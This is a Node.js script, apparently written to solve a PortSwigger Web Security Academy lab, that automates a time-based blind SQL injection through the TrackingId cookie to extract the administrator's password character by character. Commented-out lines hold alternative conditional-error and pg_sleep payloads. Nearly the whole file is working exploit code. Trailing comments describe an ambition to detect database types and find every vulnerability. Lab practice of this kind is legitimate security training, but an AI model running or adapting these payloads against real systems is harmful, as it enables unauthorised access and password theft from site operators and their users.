import { parse } from "node-html-parser";
import axios from "axios";

const subDomain = "ac1e1fb21e317e6ac0f626c400f80034";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;

const main = async () => {
  const alphabet = `0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`;
  let extractedPassword = "";
  let currentCharacterIndex = 0;
  let currentPasswordIndex = 1;

  while (true) {
    const requestTime = new Date().getTime() / 1000;
    const response = await axios.get(fullWebAddress, {
      headers: {
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN 1/0 ELSE 'a' END FROM Users)='a`,
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT username, password CASE WHEN (username = 'administrator' AND SUBSTR(password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
        // Cookie: `TrackingId=rOJkaNJiv67MIPJD'||pg_sleep(10)--`,
        Cookie: `TrackingId=rOJkaNJiv67MIPJD'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,${currentPasswordIndex},1)='${alphabet[currentCharacterIndex]}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`,
        // Cookie: `TrackingId=rOJkaNJiv67MIPJD'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`,
      },
    });
    const timeOfResponse = new Date().getTime() / 1000;
    if (timeOfResponse - requestTime > 10) {
      console.log("NEW LETTER!: ", alphabet[currentCharacterIndex]);
      extractedPassword += alphabet[currentCharacterIndex];
      currentPasswordIndex += 1;
      currentCharacterIndex = 0;
      console.log(extractedPassword);
      continue;
    }

    console.log(
      `TrackingId=rOJkaNJiv67MIPJD'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='${alphabet[currentCharacterIndex]}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`,
      new Date().getTime() / 1000 - requestTime
    );

    if (currentCharacterIndex === 61) {
      break;
    }

    currentCharacterIndex += 1;
  }
  console.log(extractedPassword);
};

main();

// Open source software
// Detects what type of database is used
// Find all vulnerabilities
// * SQL Injection
// * *
